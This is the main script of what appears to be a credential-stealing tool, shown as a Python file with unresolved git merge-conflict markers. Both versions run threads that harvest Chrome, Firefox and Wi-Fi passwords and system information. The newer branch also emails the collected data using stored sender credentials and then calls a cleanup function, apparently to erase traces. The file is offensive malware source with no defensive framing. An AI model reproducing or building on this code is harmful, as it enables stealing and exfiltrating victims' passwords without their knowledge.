<<<<<<< HEAD
import firefox
import chrome
import system
import wifi
import time
import threading
import multiprocessing

start_time = time.time()


t1 = threading.Thread(target=chrome.password, name='t1')
t2 = threading.Thread(target=firefox.password, name='t2')
t3 = threading.Thread(target=wifi.password, name='t3')
t4 = threading.Thread(target=system.info, name='t4')

t1.start()
t2.start()
t3.start()
t4.start()

t1.join()
t2.join()
t3.join()
t4.join()



print("--- %s seconds ---" % (time.time() - start_time))
=======
import wifi
import time
import secret
import chrome
import system
import firefox
import threading
from mail import sendmail,remove
from savloc import createPath

start_time = time.time()
createPath()

t1 = threading.Thread(target=chrome.password, name='t1')
t2 = threading.Thread(target=firefox.password, name='t2')
t3 = threading.Thread(target=wifi.password, name='t3')
t4 = threading.Thread(target=system.info, name='t4')

t1.start()
t2.start()
t3.start()
t4.start()

t1.join()
t2.join()
t3.join()
t4.join()

sendmail(secret.email,secret.password)
remove()

print("--- %s seconds ---" % (time.time() - start_time))
>>>>>>> 2bb1d6831671b5c20be4b37b2262c7ca51cd61a1
